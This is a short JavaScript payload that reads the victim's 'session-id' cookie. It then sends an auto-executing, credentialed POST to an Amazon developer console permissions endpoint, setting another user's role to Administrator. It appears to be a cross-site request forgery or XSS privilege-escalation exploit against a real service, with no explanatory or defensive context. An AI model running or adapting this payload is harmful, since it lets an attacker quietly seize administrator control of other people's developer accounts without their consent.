function getCookie(cname) {
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(';');
  for(let i = 0; i <ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}

function submitRequest()
      {
        var session_id = getCookie("session-id")
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/developer.amazon.com\/settings\/console\/userpermissions\/save_edit.html", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
        xhr.withCredentials = true;
        var body = session_id+"="+session_id+"&users%5B1%5D.roles=Administrator&_users%5B1%5D.roles=on&_users%5B1%5D.roles=on&_users%5B1%5D.roles=on&_users%5B1%5D.roles=on";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
